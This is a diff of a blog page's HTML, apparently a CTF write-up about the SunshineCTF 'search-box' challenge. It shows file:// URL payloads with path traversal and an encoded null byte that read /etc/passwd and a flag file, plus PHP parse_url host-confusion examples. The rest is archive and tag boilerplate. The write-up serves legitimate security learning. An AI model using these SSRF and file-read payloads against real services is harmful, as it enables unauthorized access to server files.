@@ -267,7 +267,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">331</span> / Reading time: <span class="post-count">2 min</span></span>
+                        <span>Word count: <span class="post-count">382</span> / Reading time: <span class="post-count">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -420,8 +420,9 @@
 <li>Testing locally, we find that <code>file://www.google.com/../etc/passwd</code> in fact reads <code>/etc/passwd</code>. However, search-box appends a <code>/</code><br>to the end of the url, which means the code would try to read <code>/etc/passwd/</code>, which of course doesn’t exist.</li>
 <li>Combining the two, we can send the null byte URLencoded to cURL. So the final attack URL becomes something like<br><code>file://www.google.com/../etc/flag.txt%00</code>. The final request thus becomes<br><a href="http://search-box.web1.sunshinectf.org/?submit=Submit&amp;site=file%3A%2F%2Fwww.google.com%2F..%2Fetc%2Fflag.txt%2500" rel="external nofollow" target="_blank">http://search-box.web1.sunshinectf.org/?submit=Submit&amp;site=file%3A%2F%2Fwww.google.com%2F..%2Fetc%2Fflag.txt%2500</a><br>and this finally gets us the flag.</li>
 <li>file:<a href="mailto://user@127.0.0.1" rel="external nofollow" target="_blank">//user@127.0.0.1</a>:<a href="mailto:80@www.google.com" rel="external nofollow" target="_blank">80@www.google.com</a>/etc/flag.txt</li>
-<li>file:<a href="mailto://user@127.0.0.1" rel="external nofollow" target="_blank">//user@127.0.0.1</a>:<a href="mailto:80@www.google.com" rel="external nofollow" target="_blank">80@www.google.com</a>/etc/flag.txt#</li>
+<li>file:<a href="mailto://user@127.0.0.1" rel="external nofollow" target="_blank">//user@127.0.0.1</a>:<a href="mailto:80@www.google.com" rel="external nofollow" target="_blank">80@www.google.com</a>/etc/flag.txt#‘</li>
 </ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(parse_url("http://127.0.0.1:123.@c7f.zhuque.com/..//"));</span><br><span class="line">array(5) &#123;</span><br><span class="line">  ["scheme"]=&gt;</span><br><span class="line">  string(4) "http"</span><br><span class="line">  ["host"]=&gt;</span><br><span class="line">  string(14) "c7f.zhuque.com"</span><br><span class="line">  ["user"]=&gt;</span><br><span class="line">  string(9) "127.0.0.1"</span><br><span class="line">  ["pass"]=&gt;</span><br><span class="line">  string(3) "123."</span><br><span class="line">  ["path"]=&gt;</span><br><span class="line">  string(5) "/..//"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
     </article>
     <!-- license  -->
@@ -1161,9 +1162,101 @@
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 40
+        Total : 44
         </div>
         <!-- search  -->
         
@@ -1176,6 +1269,26 @@
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href="/posts/18428/">lamp && lnmp以apt-get的方式安装</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/04</span><a class="archive-post-title" href="/posts/7418/">WEBSEC-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/posts/42614/">TokyoWesterns CTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href="/posts/12920/">awd准备工作</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1389,6 +1502,8 @@
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
+    
+        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
